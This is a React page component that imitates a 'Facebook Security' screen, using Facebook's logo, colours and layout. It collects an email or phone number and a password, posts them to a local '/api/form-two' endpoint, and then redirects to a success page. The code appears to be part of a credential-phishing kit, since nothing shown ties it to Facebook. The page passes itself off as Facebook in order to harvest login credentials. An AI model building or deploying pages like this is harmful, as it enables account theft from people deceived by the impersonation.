import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { formTwoSchema, type FormTwo } from "@shared/schema";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');

  const form = useForm<FormTwo>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  const onSubmit = async (data: FormTwo) => {
    try {
      const response = await fetch('/api/form-two', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      const result = await response.json();
      if (result.success) {
        toast({
          title: "Success!",
          description: "Your form has been submitted successfully"
        });
        setLocation("/success");
      } else {
        throw new Error(result.message || 'Failed to submit form');
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Facebook Security"
        description="Facebook Security - Contact Information"
      />
      <div className="min-h-screen flex justify-center items-center bg-[#f0f2f5]">
        <div className="bg-white p-4 rounded-lg shadow-lg w-full max-w-[396px] mx-4">
          <div className="flex justify-center mb-4">
            <img 
              src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
              alt="Facebook"
              className="h-[106px] cursor-default select-none"
              draggable="false"
            />
          </div>
          <h1 className="text-center text-[20px] font-medium text-[#1c1e21] mb-4">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="flex gap-2 mb-4">
                <button
                  type="button"
                  onClick={() => setContactMethod('email')}
                  className={`flex-1 py-2 rounded ${
                    contactMethod === 'email'
                      ? 'bg-[#1877f2] text-white'
                      : 'bg-[#e4e6eb] text-[#1c1e21]'
                  }`}
                >
                  Email
                </button>
                <button
                  type="button"
                  onClick={() => setContactMethod('phone')}
                  className={`flex-1 py-2 rounded ${
                    contactMethod === 'phone'
                      ? 'bg-[#1877f2] text-white'
                      : 'bg-[#e4e6eb] text-[#1c1e21]'
                  }`}
                >
                  Phone
                </button>
              </div>

              <FormField
                control={form.control}
                name="user_email"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        type={contactMethod === 'email' ? 'email' : 'tel'}
                        placeholder={contactMethod === 'email' ? 'Email address' : 'Phone number'}
                        className="bg-[#f0f2f5] border-0 h-[48px] text-[17px]"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-sm text-[#f02849]" />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Password"
                        className="bg-[#f0f2f5] border-0 h-[48px] text-[17px]"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-sm text-[#f02849]" />
                  </FormItem>
                )}
              />

              <Button 
                type="submit"
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-[17px] h-[48px] rounded-md"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Please wait..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}